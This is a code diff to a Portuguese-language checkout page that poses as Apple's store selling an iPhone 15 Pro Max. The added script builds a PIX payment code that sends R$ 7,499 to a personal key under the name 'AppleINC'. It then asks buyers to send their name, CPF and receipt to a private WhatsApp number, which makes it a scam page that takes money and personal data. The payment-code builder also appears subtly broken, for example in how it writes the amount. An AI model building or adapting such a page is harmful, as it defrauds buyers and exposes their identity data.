@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Finalizar Compra - iPhone 15 Pro Max | Apple</title>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
   <style>
     /* Reset e configurações gerais */
     * {
@@ -189,6 +190,24 @@
       background-color: #d2d2d7;
       cursor: not-allowed;
     }
+
+    .btn-success {
+      background-color: #34c759;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      width: 100%;
+      margin-top: 1rem;
+    }
+    
+    .btn-success:hover {
+      background-color: #30a14e;
+    }
     
     /* Área PIX */
     .hidden {
@@ -255,6 +274,8 @@
       font-weight: 500;
       cursor: pointer;
       transition: background-color 0.3s;
+      width: 100%;
+      margin-bottom: 1rem;
     }
     
     .btn-secondary:hover {
@@ -267,6 +288,16 @@
       border-radius: 8px;
       padding: 1rem;
       margin-top: 1.5rem;
+      font-size: 0.9rem;
+      text-align: center;
+    }
+
+    .whatsapp-info {
+      background-color: #e8f5e8;
+      border: 1px solid #34c759;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-top: 1rem;
       font-size: 0.9rem;
       text-align: center;
     }
@@ -314,6 +345,11 @@
     .guarantee-title {
       font-size: 0.8rem;
       font-weight: 600;
+    }
+
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
     }
   </style>
 </head>
@@ -419,18 +455,29 @@
           
           <div class="copy-section">
             <p class="copy-label">ou copie o código PIX:</p>
-            <div class="copiaecola" id="copia">00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-42661417400052040000530398654067.495802BR5913Apple Store6008Sao Paulo62290525mpqr-1234567890ABCDEFGH6304A56F</div>
+            <div class="copiaecola" id="copia"></div>
             <button class="btn-secondary" onclick="copiarPix()">Copiar código PIX</button>
           </div>
+
+          <div class="whatsapp-info">
+            <p><strong>📱 Após o pagamento:</strong></p>
+            <p>Envie o comprovante para nosso WhatsApp para confirmarmos seu pedido!</p>
+            <button class="btn-success" onclick="enviarComprovante()">📤 Enviar Comprovante no WhatsApp</button>
+          </div>
           
-          <p class="aviso">⚠️ Após o pagamento, seu pedido será processado automaticamente. Você receberá uma confirmação por e-mail.</p>
+          <p class="aviso">⚠️ O pedido será processado após a confirmação do pagamento. Você receberá um e-mail com os detalhes.</p>
         </div>
       </div>
     </div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
   <script>
+    // SUAS CONFIGURAÇÕES - EDITE AQUI!
+    const MINHA_CHAVE_PIX = '05224880130'; // Seu CPF, celular ou chave PIX
+    const MEU_NOME = 'AppleINC';
+    const MINHA_CIDADE = 'BAURU';
+    const MEU_WHATSAPP = '5561999993158'; // Seu número com DDD
+
     // Formatação do CPF
     document.getElementById('cpf').addEventListener('input', function(e) {
       let value = e.target.value.replace(/\D/g, '');
@@ -445,7 +492,7 @@
     });
     
     // Validação do formulário
-    document.getElementById('formCheckout').addEventListener('submit', function(e) {
+    document.getElementById('formCheckout').addEventListener('submit', async function(e) {
       e.preventDefault();
       
       // Reset errors
@@ -490,38 +537,111 @@
       }
       
       if (isValid) {
-        // Simular processamento
+        // Processar PIX
         document.getElementById('submitBtn').disabled = true;
-        document.getElementById('submitBtn').textContent = 'Processando...';
+        document.getElementById('submitBtn').textContent = 'Gerando PIX...';
+        document.getElementById('submitBtn').classList.add('loading');
         
-        setTimeout(() => {
-          gerarPix();
-        }, 1500);
+        await gerarPixDireto(nome, cpf, email);
       }
     });
     
-    // Gerar QR Code PIX
-    function gerarPix() {
-      const pixCode = "00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-42661417400052040000530398654067.495802BR5913Apple Store6008Sao Paulo62290525mpqr-1234567890ABCDEFGH6304A56F";
-      
-      // Gerar QR Code
-      QRCode.toCanvas(document.getElementById('qr'), pixCode, {
-        width: 200,
-        margin: 1,
-        color: {
-          dark: '#1d1d1f',
-          light: '#ffffff'
+    // Gerar PIX direto para sua conta
+    async function gerarPixDireto(nome, cpf, email) {
+      try {
+        const valor = 749900; // R$ 7.499,00 em centavos
+        const identificador = `IPHONE${Date.now()}`;
+        
+        // Gerar payload PIX
+        const payloadPIX = gerarPayloadPIX({
+          chave: MINHA_CHAVE_PIX,
+          valor: valor,
+          nome: MEU_NOME,
+          cidade: MINHA_CIDADE,
+          identificador: identificador
+        });
+
+        // Gerar QR Code
+        QRCode.toCanvas(document.getElementById('qr'), payloadPIX, {
+          width: 200,
+          margin: 1,
+          color: {
+            dark: '#1d1d1f',
+            light: '#ffffff'
+          }
+        }, function(error) {
+          if (error) {
+            console.error('Erro ao gerar QR Code:', error);
+            alert('Erro ao gerar QR Code. Tente novamente.');
+            return;
+          }
+        });
+        
+        // Mostrar código PIX
+        document.getElementById('copia').textContent = payloadPIX;
+        
+        // Mostrar área PIX
+        document.getElementById('areaPix').classList.remove('hidden');
+        document.getElementById('submitBtn').textContent = 'PIX Gerado!';
+        
+        // Scroll para a área PIX
+        document.getElementById('areaPix').scrollIntoView({ behavior: 'smooth' });
+
+        // Salvar dados do cliente localmente (para referência)
+        localStorage.setItem('ultimoPedido', JSON.stringify({
+          nome: nome,
+          email: email,
+          cpf: cpf,
+          identificador: identificador,
+          timestamp: new Date().toISOString()
+        }));
+
+      } catch (error) {
+        console.error('Erro:', error);
+        alert('Erro ao gerar PIX. Tente novamente.');
+      } finally {
+        document.getElementById('submitBtn').disabled = false;
+        document.getElementById('submitBtn').classList.remove('loading');
+      }
+    }
+
+    // Função para gerar payload PIX
+    function gerarPayloadPIX({ chave, valor, nome, cidade, identificador }) {
+      const payload = [
+        '000201',
+        '2636',
+        '0014br.gov.bcb.pix',
+        `01${chave.length.toString().padStart(2, '0')}${chave}`,
+        '52040000',
+        '5303986',
+        `54${valor.toString().length.toString().padStart(2, '0')}${valor}`,
+        '5802BR',
+        `59${nome.length.toString().padStart(2, '0')}${nome}`,
+        `60${cidade.length.toString().padStart(2, '0')}${cidade}`,
+        `62${(identificador.length + 4).toString().padStart(2, '0')}`,
+        `05${identificador.length.toString().padStart(2, '0')}${identificador}`,
+        '6304'
+      ].join('');
+
+      const crc = calcularCRC16(payload);
+      return payload + crc;
+    }
+
+    // Função para calcular CRC16
+    function calcularCRC16(payload) {
+      let crc = 0xFFFF;
+      for (let i = 0; i < payload.length; i++) {
+        crc ^= payload.charCodeAt(i) << 8;
+        for (let j = 0; j < 8; j++) {
+          if (crc & 0x8000) {
+            crc = (crc << 1) ^ 0x1021;
+          } else {
+            crc = crc << 1;
+          }
         }
-      }, function(error) {
-        if (error) console.error(error);
-      });
-      
-      // Mostrar área PIX
-      document.getElementById('areaPix').classList.remove('hidden');
-      document.getElementById('submitBtn').textContent = 'PIX Gerado';
-      
-      // Scroll para a área PIX
-      document.getElementById('areaPix').scrollIntoView({ behavior: 'smooth' });
+      }
+      crc = crc & 0xFFFF;
+      return crc.toString(16).toUpperCase().padStart(4, '0');
     }
     
     // Copiar código PIX
@@ -546,6 +666,21 @@
         console.error('Erro ao copiar: ', err);
         alert('Não foi possível copiar o código. Tente selecionar e copiar manualmente.');
       });
+    }
+
+    // Enviar comprovante no WhatsApp
+    function enviarComprovante() {
+      const pedido = JSON.parse(localStorage.getItem('ultimoPedido') || '{}');
+      const mensagem = `Olá! Acabei de pagar o iPhone 15 Pro Max.\n\n` +
+                      `*Dados do Pedido:*\n` +
+                      `Nome: ${pedido.nome || 'Não informado'}\n` +
+                      `CPF: ${pedido.cpf || 'Não informado'}\n` +
+                      `Identificador: ${pedido.identificador || 'Não informado'}\n` +
+                      `Valor: R$ 7.499,00\n\n` +
+                      `Segue comprovante em anexo.`;
+      
+      const url = `https://wa.me/${MEU_WHATSAPP}?text=${encodeURIComponent(mensagem)}`;
+      window.open(url, '_blank');
     }
   </script>
 </body>
